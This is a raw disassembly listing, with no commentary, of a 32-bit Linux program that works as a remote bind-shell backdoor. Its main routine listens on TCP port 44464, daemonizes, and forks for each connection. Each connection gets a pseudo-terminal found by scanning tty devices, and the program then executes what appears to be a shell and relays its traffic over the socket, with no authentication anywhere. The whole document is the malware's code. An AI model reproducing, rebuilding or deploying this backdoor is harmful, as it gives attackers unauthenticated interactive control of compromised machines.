push   ebp
mov    ebp,esp
sub    esp,0x14
push   ebx
call   80487bc <_init+0xc>
pop    ebx
add    ebx,0x1f84
call   8048a44 <call_gmon_start>
call   8048ac8 <frame_dummy>
call   80495c0 <__do_global_ctors_aux>
pop    ebx
leave  
ret    
push   DWORD PTR ds:0x804a744
jmp    DWORD PTR ds:0x804a748
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804a74c
push   0x0
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a750
push   0x8
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a754
push   0x10
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a758
push   0x18
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a75c
push   0x20
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a760
push   0x28
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a764
push   0x30
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a768
push   0x38
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a76c
push   0x40
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a770
push   0x48
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a774
push   0x50
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a778
push   0x58
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a77c
push   0x60
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a780
push   0x68
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a784
push   0x70
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a788
push   0x78
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a78c
push   0x80
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a790
push   0x88
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a794
push   0x90
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a798
push   0x98
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a79c
push   0xa0
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7a0
push   0xa8
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7a4
push   0xb0
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7a8
push   0xb8
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7ac
push   0xc0
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7b0
push   0xc8
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7b4
push   0xd0
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7b8
push   0xd8
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7bc
push   0xe0
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7c0
push   0xe8
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7c4
push   0xf0
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7c8
push   0xf8
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7cc
push   0x100
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7d0
push   0x108
jmp    80487d8 <.plt>
jmp    DWORD PTR ds:0x804a7d4
push   0x110
jmp    80487d8 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff0
push   eax
push   esp
push   edx
push   0x80495f0
push   0x80487b0
push   ecx
push   esi
push   0x8048cfc
call   8048928 <__libc_start_main@plt>
hlt    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x14
push   ebx
call   8048a50 <call_gmon_start+0xc>
pop    ebx
add    ebx,0x1cf0
mov    eax,DWORD PTR [ebx+0x98]
test   eax,eax
je     8048a63 <call_gmon_start+0x1f>
call   eax
pop    ebx
leave  
ret    
mov    esi,esi
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
cmp    DWORD PTR ds:0x804a728,0x0
jne    8048abd <__do_global_dtors_aux+0x4d>
jmp    8048a93 <__do_global_dtors_aux+0x23>
mov    eax,ds:0x804a724
lea    edx,[eax+0x4]
mov    DWORD PTR ds:0x804a724,edx
mov    eax,DWORD PTR [eax]
call   eax
mov    eax,ds:0x804a724
cmp    DWORD PTR [eax],0x0
jne    8048a81 <__do_global_dtors_aux+0x11>
mov    eax,0x80488d8
test   eax,eax
je     8048ab3 <__do_global_dtors_aux+0x43>
add    esp,0xfffffff4
push   0x804a72c
call   80488d8 <__deregister_frame_info@plt>
mov    DWORD PTR ds:0x804a728,0x1
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,0x80487e8
test   eax,eax
je     8048ae9 <frame_dummy+0x21>
add    esp,0xfffffff8
push   0x804a880
push   0x804a72c
call   80487e8 <__register_frame_info@plt>
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
leave  
ret    
lea    esi,[esi+0x0]
lea    edi,[edi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x40
push   edi
push   esi
lea    eax,[ebp-0x14]
lea    edi,[ebp-0x14]
mov    esi,0x8049640
cld    
mov    ecx,0x4
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
lea    eax,[ebp-0x28]
lea    edi,[ebp-0x28]
mov    esi,0x8049651
cld    
mov    ecx,0x4
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp+0xc]
push   eax
call   8048908 <strlen@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x2c],eax
add    esp,0xfffffff8
mov    eax,DWORD PTR [ebp+0xc]
push   eax
mov    eax,DWORD PTR [ebp+0x10]
push   eax
call   8048a08 <strcpy@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp+0x10]
mov    edx,DWORD PTR [ebp-0x2c]
add    eax,edx
mov    edx,DWORD PTR [ebp+0x8]
sar    edx,0x4
mov    ecx,edx
and    ecx,0xf
lea    edx,[ebp-0x14]
mov    cl,BYTE PTR [ecx+edx*1]
mov    BYTE PTR [eax],cl
mov    eax,DWORD PTR [ebp-0x2c]
mov    ecx,DWORD PTR [ebp+0x10]
lea    edx,[ecx+eax*1]
lea    eax,[edx+0x1]
mov    edx,DWORD PTR [ebp+0x8]
and    edx,0xf
lea    ecx,[ebp-0x28]
mov    dl,BYTE PTR [edx+ecx*1]
mov    BYTE PTR [eax],dl
mov    eax,DWORD PTR [ebp-0x2c]
mov    edx,DWORD PTR [ebp+0x10]
add    eax,edx
lea    edx,[eax+0x2]
mov    BYTE PTR [edx],0x0
lea    esp,[ebp-0x48]
pop    esi
pop    edi
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x218
add    esp,0xfffffff8
push   0x2
push   0x8049662
call   8048978 <open@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x208],eax
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x208]
push   eax
call   8048808 <close@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x204],0x0
nop
cmp    DWORD PTR [ebp-0x204],0xff
jle    8048bf1 <open_tty+0x51>
jmp    8048ca0 <open_tty+0x100>
add    esp,0xfffffffc
lea    eax,[ebp-0x200]
push   eax
push   0x804966c
mov    eax,DWORD PTR [ebp-0x204]
push   eax
call   8048b00 <get_tty>
add    esp,0x10
add    esp,0xfffffff8
push   0x2
lea    eax,[ebp-0x200]
push   eax
call   8048978 <open@plt>
add    esp,0x10
mov    eax,eax
mov    edx,DWORD PTR [ebp+0xc]
mov    DWORD PTR [edx],eax
mov    eax,DWORD PTR [ebp+0xc]
cmp    DWORD PTR [eax],0x0
jge    8048c34 <open_tty+0x94>
jmp    8048c90 <open_tty+0xf0>
add    esp,0xfffffffc
lea    eax,[ebp-0x200]
push   eax
push   0x8049675
mov    eax,DWORD PTR [ebp-0x204]
push   eax
call   8048b00 <get_tty>
add    esp,0x10
add    esp,0xfffffff8
push   0x2
lea    eax,[ebp-0x200]
push   eax
call   8048978 <open@plt>
add    esp,0x10
mov    eax,eax
mov    edx,DWORD PTR [ebp+0x8]
mov    DWORD PTR [edx],eax
mov    eax,DWORD PTR [ebp+0x8]
cmp    DWORD PTR [eax],0x0
jge    8048c88 <open_tty+0xe8>
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
call   8048808 <close@plt>
add    esp,0x10
jmp    8048c90 <open_tty+0xf0>
mov    eax,0x1
jmp    8048ca4 <open_tty+0x104>
nop
inc    DWORD PTR [ebp-0x204]
jmp    8048be0 <open_tty+0x40>
nop
lea    esi,[esi+eiz*1+0x0]
xor    eax,eax
jmp    8048ca4 <open_tty+0x104>
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
add    esp,0xfffffff8
push   0x8048ca8
push   0x11
call   8048838 <signal@plt>
add    esp,0x10
add    esp,0xfffffffc
push   0x1
push   0x0
push   0xffffffff
call   80488e8 <waitpid@plt>
add    esp,0x10
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
add    esp,0xfffffff8
push   0x1
push   0x0
call   80489c8 <kill@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0xf
push   0x0
call   80489c8 <kill@plt>
add    esp,0x10
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x1881c
push   edi
push   esi
push   ebx
add    esp,0xfffffffc
push   0x6
push   0x1
push   0x2
call   80489e8 <socket@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x28],eax
cmp    DWORD PTR [ebp-0x28],0x0
jge    8048d40 <main+0x44>
add    esp,0xfffffff4
push   0x804967e
call   8048818 <perror@plt>
add    esp,0x10
mov    eax,0x1
jmp    80495a6 <main+0x8aa>
mov    esi,esi
add    esp,0xfffffff8
push   0x10
lea    eax,[ebp-0x14]
push   eax
call   8048988 <bzero@plt>
add    esp,0x10
mov    WORD PTR [ebp-0x14],0x2
add    esp,0xfffffff4
push   0x0
call   8048868 <htonl@plt>
add    esp,0x10
mov    eax,eax
mov    edx,eax
mov    DWORD PTR [ebp-0x10],edx
add    esp,0xfffffff4
push   0xadb0
call   80489b8 <htons@plt>
add    esp,0x10
mov    eax,eax
mov    edx,eax
mov    WORD PTR [ebp-0x12],dx
add    esp,0xfffffffc
push   0x10
lea    eax,[ebp-0x14]
push   eax
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048958 <bind@plt>
add    esp,0x10
mov    eax,eax
test   eax,eax
jge    8048db8 <main+0xbc>
add    esp,0xfffffff4
push   0x8049685
call   8048818 <perror@plt>
add    esp,0x10
mov    eax,0x1
jmp    80495a6 <main+0x8aa>
add    esp,0xfffffff8
push   0x5
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   80488a8 <listen@plt>
add    esp,0x10
mov    eax,eax
test   eax,eax
jge    8048df0 <main+0xf4>
add    esp,0xfffffff4
push   0x804968a
call   8048818 <perror@plt>
add    esp,0x10
mov    eax,0x1
jmp    80495a6 <main+0x8aa>
lea    esi,[esi+eiz*1+0x0]
add    esp,0xfffffff4
push   0x80496a0
call   8048948 <printf@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,ds:0x804a87c
push   eax
call   8048848 <fflush@plt>
add    esp,0x10
call   8048828 <fork@plt>
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
je     8048e40 <main+0x144>
add    esp,0xfffffff8
mov    eax,DWORD PTR [ebp-0x4]
push   eax
push   0x80496c5
call   8048948 <printf@plt>
add    esp,0x10
xor    eax,eax
jmp    80495a6 <main+0x8aa>
lea    esi,[esi+eiz*1+0x0]
call   80488b8 <setsid@plt>
add    esp,0xfffffff4
push   0x80496d3
call   80488f8 <chdir@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x2
push   0x80496d5
call   8048978 <open@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
add    esp,0xfffffff8
push   0x0
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   8048938 <dup2@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x1
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   8048938 <dup2@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x2
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   8048938 <dup2@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x1
push   0x1
call   8048838 <signal@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x8048ca8
push   0x11
call   8048838 <signal@plt>
add    esp,0x10
nop
jmp    8048ed7 <main+0x1db>
jmp    80495a6 <main+0x8aa>
mov    DWORD PTR [ebp-0x30],0x10
add    esp,0xfffffffc
lea    eax,[ebp-0x30]
push   eax
lea    eax,[ebp-0x24]
push   eax
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048898 <accept@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x2c],eax
cmp    DWORD PTR [ebp-0x2c],0x0
jge    8048f02 <main+0x206>
jmp    8048ed0 <main+0x1d4>
call   8048828 <fork@plt>
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8049592 <main+0x896>
lea    eax,[ebp-0x80c8]
mov    DWORD PTR [ebp-0x80c8],0x80496df
mov    DWORD PTR [ebp-0x80c4],0x80496e2
mov    DWORD PTR [ebp-0x80c0],0x0
lea    eax,[ebp-0x187d0]
mov    DWORD PTR [ebp-0x84c8],eax
add    esp,0xfffffffc
push   0x80496e5
push   0x80496ee
lea    eax,[ebp-0x187d0]
push   eax
call   80489d8 <sprintf@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x186cc],0x0
lea    esi,[esi+eiz*1+0x0]
add    esp,0xfffffffc
push   0x100
lea    eax,[ebp-0x186c8]
mov    edx,DWORD PTR [ebp-0x186cc]
mov    ecx,edx
mov    edx,ecx
shl    edx,0x8
add    eax,edx
push   eax
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   80489f8 <read@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x186d0],eax
mov    edx,DWORD PTR [ebp-0x186cc]
inc    edx
lea    eax,[edx*4+0x0]
lea    edx,[ebp-0x84c8]
lea    ecx,[ebp-0x186c8]
mov    ebx,DWORD PTR [ebp-0x186cc]
mov    esi,ebx
mov    ebx,esi
shl    ebx,0x8
lea    esi,[ebx+ecx*1]
mov    DWORD PTR [eax+edx*1],esi
inc    DWORD PTR [ebp-0x186cc]
cmp    DWORD PTR [ebp-0x186cc],0xff
jg     8048ff0 <main+0x2f4>
cmp    DWORD PTR [ebp-0x186d0],0xff
jle    8048ff0 <main+0x2f4>
jmp    8048ff2 <main+0x2f6>
nop
jmp    8049015 <main+0x319>
mov    eax,DWORD PTR [ebp-0x186cc]
dec    eax
mov    edx,eax
mov    eax,edx
shl    eax,0x8
lea    edx,[ebp-0x186c8]
cmp    BYTE PTR [eax+edx*1],0xa
jne    8049010 <main+0x314>
jmp    8049015 <main+0x319>
mov    esi,esi
jmp    8048f70 <main+0x274>
mov    eax,DWORD PTR [ebp-0x186cc]
inc    eax
lea    edx,[eax*4+0x0]
lea    eax,[ebp-0x84c8]
mov    DWORD PTR [edx+eax*1],0x0
add    esp,0xfffffff8
push   0x0
push   0x0
call   8048918 <setpgid@plt>
add    esp,0x10
add    esp,0xfffffff8
lea    eax,[ebp-0x3c]
push   eax
lea    eax,[ebp-0x38]
push   eax
call   8048ba0 <open_tty>
add    esp,0x10
mov    eax,eax
test   eax,eax
jne    80490c0 <main+0x3c4>
lea    eax,[ebp-0x187e8]
lea    edi,[ebp-0x187e8]
mov    esi,0x80496f6
cld    
mov    ecx,0x5
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
movs   WORD PTR es:[edi],WORD PTR ds:[esi]
add    esp,0xfffffffc
add    esp,0xfffffff4
lea    eax,[ebp-0x187e8]
push   eax
call   8048908 <strlen@plt>
add    esp,0x10
mov    eax,eax
push   eax
lea    eax,[ebp-0x187e8]
push   eax
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   80487f8 <write@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffff4
push   0x0
call   8048998 <exit@plt>
add    esp,0x10
lea    esi,[esi+0x0]
call   8048828 <fork@plt>
mov    eax,eax
mov    DWORD PTR [ebp-0x34],eax
cmp    DWORD PTR [ebp-0x34],0x0
jne    8049198 <main+0x49c>
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x3c]
push   eax
call   8048808 <close@plt>
add    esp,0x10
call   80488b8 <setsid@plt>
add    esp,0xfffffff8
push   0x540e
mov    eax,DWORD PTR [ebp-0x38]
push   eax
call   80489a8 <ioctl@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x0
push   0x1
call   8048838 <signal@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x0
push   0x11
call   8048838 <signal@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x0
mov    eax,DWORD PTR [ebp-0x38]
push   eax
call   8048938 <dup2@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x1
mov    eax,DWORD PTR [ebp-0x38]
push   eax
call   8048938 <dup2@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x2
mov    eax,DWORD PTR [ebp-0x38]
push   eax
call   8048938 <dup2@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x38]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffffc
lea    eax,[ebp-0x84c8]
push   eax
lea    eax,[ebp-0x80c8]
push   eax
push   0x804970c
call   8048878 <execve@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x38]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x8048cd4
push   0x1
call   8048838 <signal@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x8048cd4
push   0xf
call   8048838 <signal@plt>
add    esp,0x10
nop
lea    esi,[esi+eiz*1+0x0]
jmp    80491d7 <main+0x4db>
jmp    8049540 <main+0x844>
xor    eax,eax
mov    ecx,0x20
lea    edx,[ebp-0xbc]
mov    edi,edx
cld    
rep stos DWORD PTR es:[edi],eax
mov    eax,ecx
mov    DWORD PTR [ebp-0x187ec],eax
mov    eax,edi
mov    DWORD PTR [ebp-0x187f0],eax
jmp    8049202 <main+0x506>
nop
lea    esi,[esi+eiz*1+0x0]
jmp    80491d7 <main+0x4db>
mov    eax,DWORD PTR [ebp-0x3c]
mov    edx,eax
shr    edx,0x5
lea    eax,[edx*4+0x0]
lea    edx,[ebp-0xbc]
mov    ecx,DWORD PTR [ebp-0x3c]
mov    ebx,ecx
and    ebx,0x1f
bts    DWORD PTR [eax+edx*1],ebx
mov    eax,DWORD PTR [ebp-0x2c]
mov    edx,eax
shr    edx,0x5
lea    eax,[edx*4+0x0]
lea    edx,[ebp-0xbc]
mov    ecx,DWORD PTR [ebp-0x2c]
mov    ebx,ecx
and    ebx,0x1f
bts    DWORD PTR [eax+edx*1],ebx
add    esp,0xfffffff4
push   0x0
push   0x0
push   0x0
lea    eax,[ebp-0xbc]
push   eax
mov    eax,DWORD PTR [ebp-0x3c]
cmp    eax,DWORD PTR [ebp-0x2c]
jle    8049262 <main+0x566>
mov    eax,DWORD PTR [ebp-0x3c]
inc    eax
jmp    8049266 <main+0x56a>
mov    eax,DWORD PTR [ebp-0x2c]
inc    eax
push   eax
call   8048858 <select@plt>
add    esp,0x20
mov    eax,eax
test   eax,eax
jge    8049280 <main+0x584>
jmp    8049540 <main+0x844>
lea    esi,[esi+0x0]
mov    ecx,DWORD PTR [ebp-0x3c]
mov    edx,ecx
and    edx,0x1f
mov    ebx,DWORD PTR [ebp-0x3c]
mov    ecx,ebx
shr    ecx,0x5
lea    ebx,[ecx*4+0x0]
lea    ecx,[ebp-0xbc]
bt     DWORD PTR [ebx+ecx*1],edx
setb   al
test   al,al
je     8049308 <main+0x60c>
add    esp,0xfffffffc
push   0x8000
lea    eax,[ebp-0x80bc]
push   eax
mov    eax,DWORD PTR [ebp-0x3c]
push   eax
call   80489f8 <read@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x187f0],eax
cmp    DWORD PTR [ebp-0x187f0],0x0
jg     80492e0 <main+0x5e4>
jmp    8049540 <main+0x844>
lea    esi,[esi+eiz*1+0x0]
add    esp,0xfffffffc
mov    eax,DWORD PTR [ebp-0x187f0]
push   eax
lea    eax,[ebp-0x80bc]
push   eax
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   80487f8 <write@plt>
add    esp,0x10
mov    eax,eax
test   eax,eax
jg     8049308 <main+0x60c>
jmp    8049540 <main+0x844>
mov    ecx,DWORD PTR [ebp-0x2c]
mov    edx,ecx
and    edx,0x1f
mov    ebx,DWORD PTR [ebp-0x2c]
mov    ecx,ebx
shr    ecx,0x5
lea    ebx,[ecx*4+0x0]
lea    ecx,[ebp-0xbc]
bt     DWORD PTR [ebx+ecx*1],edx
setb   al
test   al,al
je     8049535 <main+0x839>
lea    esi,[ebp-0x80bc]
mov    DWORD PTR [ebp-0x187f4],esi
add    esp,0xfffffffc
push   0x8000
lea    eax,[ebp-0x80bc]
push   eax
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   80489f8 <read@plt>
add    esp,0x10
mov    eax,eax
mov    DWORD PTR [ebp-0x187f0],eax
cmp    DWORD PTR [ebp-0x187f0],0x0
jg     8049371 <main+0x675>
jmp    8049540 <main+0x844>
add    esp,0xfffffffc
mov    eax,DWORD PTR [ebp-0x187f0]
push   eax
push   0x1d
lea    eax,[ebp-0x80bc]
push   eax
call   8048888 <memchr@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x187ec],eax
cmp    DWORD PTR [ebp-0x187ec],0x0
je     8049510 <main+0x814>
lea    eax,[ebp-0x80bc]
mov    edx,DWORD PTR [ebp-0x187ec]
sub    edx,eax
mov    eax,DWORD PTR [ebp-0x187f0]
sub    eax,edx
mov    DWORD PTR [ebp-0x18800],eax
cmp    DWORD PTR [ebp-0x18800],0x5
jle    80493ce <main+0x6d2>
mov    DWORD PTR [ebp-0x18800],0x5
add    esp,0xfffffffc
mov    eax,DWORD PTR [ebp-0x18800]
push   eax
mov    eax,DWORD PTR [ebp-0x187ec]
push   eax
lea    eax,[ebp-0x187fc]
push   eax
call   8048968 <memcpy@plt>
add    esp,0x10
cmp    DWORD PTR [ebp-0x18800],0x4
jg     8049423 <main+0x727>
add    esp,0xfffffffc
mov    edx,0x5
mov    eax,edx
sub    eax,DWORD PTR [ebp-0x18800]
push   eax
lea    eax,[ebp-0x187fc]
mov    edx,eax
add    edx,DWORD PTR [ebp-0x18800]
push   edx
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   80489f8 <read@plt>
add    esp,0x10
mov    WORD PTR [ebp-0x18802],0x0
mov    WORD PTR [ebp-0x18804],0x0
movzx  ax,BYTE PTR [ebp-0x187fb]
mov    edx,eax
shl    edx,0x8
movzx  ax,BYTE PTR [ebp-0x187fa]
mov    ecx,edx
add    ecx,eax
mov    WORD PTR [ebp-0x18806],cx
movzx  ax,BYTE PTR [ebp-0x187f9]
mov    edx,eax
shl    edx,0x8
movzx  ax,BYTE PTR [ebp-0x187f8]
mov    esi,edx
add    esi,eax
mov    WORD PTR [ebp-0x18808],si
add    esp,0xfffffffc
lea    eax,[ebp-0x18808]
push   eax
push   0x5414
mov    eax,DWORD PTR [ebp-0x3c]
push   eax
call   80489a8 <ioctl@plt>
add    esp,0x10
add    esp,0xfffffff8
push   0x1c
push   0x0
call   80489c8 <kill@plt>
add    esp,0x10
add    esp,0xfffffffc
lea    eax,[ebp-0x80bc]
mov    edx,DWORD PTR [ebp-0x187ec]
sub    edx,eax
push   edx
lea    eax,[ebp-0x80bc]
push   eax
mov    eax,DWORD PTR [ebp-0x3c]
push   eax
call   80487f8 <write@plt>
add    esp,0x10
lea    eax,[ebp-0x80bc]
mov    edx,eax
add    edx,DWORD PTR [ebp-0x187f0]
lea    eax,[edx-0x5]
mov    edx,eax
sub    edx,DWORD PTR [ebp-0x187ec]
mov    DWORD PTR [ebp-0x18800],edx
cmp    DWORD PTR [ebp-0x18800],0x0
jle    804950c <main+0x810>
add    esp,0xfffffffc
mov    eax,DWORD PTR [ebp-0x18800]
push   eax
mov    eax,DWORD PTR [ebp-0x187ec]
add    eax,0x5
push   eax
mov    eax,DWORD PTR [ebp-0x3c]
push   eax
call   80487f8 <write@plt>
add    esp,0x10
jmp    8049535 <main+0x839>
mov    esi,esi
add    esp,0xfffffffc
mov    eax,DWORD PTR [ebp-0x187f0]
push   eax
mov    eax,DWORD PTR [ebp-0x187f4]
push   eax
mov    eax,DWORD PTR [ebp-0x3c]
push   eax
call   80487f8 <write@plt>
add    esp,0x10
mov    eax,eax
test   eax,eax
jg     8049535 <main+0x839>
jmp    8049540 <main+0x844>
jmp    80491d0 <main+0x4d4>
lea    esi,[esi+0x0]
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x28]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x3c]
push   eax
call   8048808 <close@plt>
add    esp,0x10
add    esp,0xfffffffc
push   0x0
push   0x0
mov    eax,DWORD PTR [ebp-0x34]
push   eax
call   80488e8 <waitpid@plt>
add    esp,0x10
call   80488c8 <vhangup@plt>
add    esp,0xfffffff4
push   0x0
call   8048998 <exit@plt>
add    esp,0x10
add    esp,0xfffffff4
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
call   8048808 <close@plt>
add    esp,0x10
jmp    8048ed0 <main+0x1d4>
lea    esp,[ebp-0x18828]
pop    ebx
pop    esi
pop    edi
leave  
ret    
jmp    80495c0 <__do_global_ctors_aux>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x14
push   ebx
mov    ebx,0x804a730
cmp    DWORD PTR ds:0x804a730,0xffffffff
je     80495e1 <__do_global_ctors_aux+0x21>
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    80495d5 <__do_global_ctors_aux+0x15>
pop    ebx
leave  
ret    
push   ebp
mov    ebp,esp
sub    esp,0x8
leave  
ret    
lea    esi,[esi+eiz*1+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x14
push   ebx
call   80495fc <_fini+0xc>
pop    ebx
add    ebx,0x1144
nop
call   8048a70 <__do_global_dtors_aux>
pop    ebx
leave  
ret    
